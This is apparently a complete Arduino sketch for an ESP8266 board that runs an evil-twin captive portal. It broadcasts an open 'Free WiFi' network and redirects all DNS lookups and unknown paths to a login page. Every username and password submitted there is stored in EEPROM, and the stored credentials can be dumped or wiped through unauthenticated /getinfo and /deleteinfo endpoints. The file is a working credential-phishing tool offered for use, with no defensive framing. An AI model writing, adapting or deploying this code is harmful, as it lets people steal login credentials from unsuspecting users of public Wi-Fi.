#include <FS.h>
#include <EEPROM.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

String SSID_NAME = "Free WiFi"; //Change this to your prefered SSID

const byte HTTP_PORT = 80;
const byte DNS_PORT = 53;

IPAddress apIP(172, 0, 0, 1);
IPAddress netMask(255, 255, 255, 0);

DNSServer dnsServer;
ESP8266WebServer httpServer(HTTP_PORT);

int memorySize() {
  String text;
  int nullCount = 0;
  
  for (int i = 0; i < 512; i++) {
    text = text + char(EEPROM.read(0x0F + i));
    
    if(String(EEPROM.read(0x0F + i)).length() == 1) {
      nullCount = nullCount + 1;  
    }
  }
  
  return text.length() - nullCount;
}

void writeToMemory(String text) {
  int memSize = memorySize();
  for (int i = 0; i < text.length(); i++) {
    EEPROM.write(0x0F + memSize + 1 + i, text[i]);
  }
  
  EEPROM.commit();
}

String readFromMemory() {
  String text;

  for (int i = 0; i < 512; i++) {
    text = text + char(EEPROM.read(0x0F + i));
  }

  return text;
}

void clearMemory() {
  for (int i = 0; i < 512; i++) {
    EEPROM.write(i, 0);
  }
  EEPROM.end();
  ESP.restart();
}

void setup() {
  Serial.begin(9600);
  Serial.println("");

  SPIFFS.begin();
  EEPROM.begin(512);

  delay(10);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", apIP);

  httpServer.serveStatic("/", SPIFFS, "/index.html");
  httpServer.serveStatic("/assets", SPIFFS, "/assets");
  
  httpServer.on("/postinfo", []() {
    String username = httpServer.arg("username");
    String password = httpServer.arg("password");

    writeToMemory(username + ":" + password + "<br>");

    httpServer.send(200, "text/html", "Connected");
  });

  httpServer.on("/getinfo", []() {
    String data = readFromMemory();
    httpServer.send(200, "text/html", data);
  });

  httpServer.on("/deleteinfo", []() {
     clearMemory();
     httpServer.send(200, "text/html", "OK");
  });

  httpServer.onNotFound([]() {
    httpServer.sendHeader("Location", String("/"), true);
    httpServer.send(302, "text/plain", "");
  });

  httpServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  httpServer.handleClient();
}
